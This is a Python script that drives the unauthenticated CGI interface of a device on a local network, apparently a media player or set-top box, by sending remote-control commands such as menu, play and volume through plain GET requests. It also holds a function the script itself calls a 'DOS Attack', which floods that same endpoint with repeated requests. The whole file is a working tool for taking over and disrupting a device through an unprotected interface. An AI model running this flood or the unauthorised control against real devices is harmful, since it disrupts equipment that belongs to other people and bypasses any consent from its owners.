import os
import requests
import time

def excution(command):
    try:
        response = requests.get("http://192.168.59.254/cgi-bin/IpodCGI.cgi?id=0&command=" + command)
        print(response, "\n")
    except:
        print("\n[ Command not Excution ]")

def dos():
    cycle = int(input("cycle > "))
    try:
        for i in range (1, cycle):
            requests.get("http://192.168.59.254/cgi-bin/IpodCGI.cgi?id=0&command=menu")
            time.sleep(0.01)
            print(str(i) + ". Command Excution !!")
    except:
        print("\n[ End of DOS Attack ]")

def helper():
    print("[ COMMAND ]")
    print("\n")
    print("\033[96mmenu :\033[0m\n")
    print("\033[96mguide :\033[0m\n")
    print("\033[96msetup :\033[0m\n")
    print("\033[96mselect :\033[0m\n")
    print("\033[96mreturn :\033[0m\n")
    print("\033[96mup :\033[0m\n")
    print("\033[96mdown :\033[0m\n")
    print("\033[96mright :\033[0m\n")
    print("\033[96mleft :\033[0m\n")
    print("\033[96mnext :\033[0m\n")
    print("\033[96mprev :\033[0m\n")
    print("\033[96mplay :\033[0m\n")
    print("\033[96mstop :\033[0m\n")
    print("\033[96mfrwd :\033[0m\n")
    print("\033[96mffwd :\033[0m\n")
    print("\033[96moption_red :\033[0m\n")
    print("\033[96moption_green :\033[0m\n")
    print("\033[96mdos :\033[0m\n")
    print("\033[96mvolup :\033[0m\n")
    print("\033[96mvoldown :\033[0m\n")
    print("\033[96mmute :\033[0m\n")
    print("\033[96mclear :\033[0m\n")
    print("\033[96mexit :\033[0m\n")


if __name__ == "__main__":
    while True:
        command = input("\033[96mcommand >\033[0m ")

        if (command == "menu"):
            excution(command)

        elif (command == "up"):
            excution(command)

        elif (command == "guide"):
            excution(command)

        elif (command == "left"):
            excution(command)
            
        elif (command == "select"):
            excution(command)

        elif (command == "right"):
            excution(command)

        elif (command == "return"):
            excution(command)

        elif (command == "down"):
            excution(command)

        elif (command == "setup"):
            excution(command)

        elif (command == "play"):
            excution(command)

        elif (command == "stop"):
            excution(command)

        elif (command == "zoom"):
            excution(command)

        elif (command == "frwd"):
            excution(command)

        elif (command == "ffwd"):
            excution(command)

        elif (command == "prev"):
            excution(command)

        elif (command == "next"):
            excution(command)
            
        elif (command == "option_red"):
            excution(command)
            
        elif (command == "option_green"):
            excution(command)
            
        elif (command == "volup"):
            excution(command)

        elif (command == "voldown"):
            excution(command)

        elif (command == "mute"):
            excution(command)
            
        elif (command == "clear"):
            os.system("clear")

        elif (command == "exit"):
            print("BYE BYE !!")
            exit()

        elif (command == "dos"):
            dos()
            
        elif (command == "help"):
            helper()

        else:
            print("[ Command not Exist ] -> help")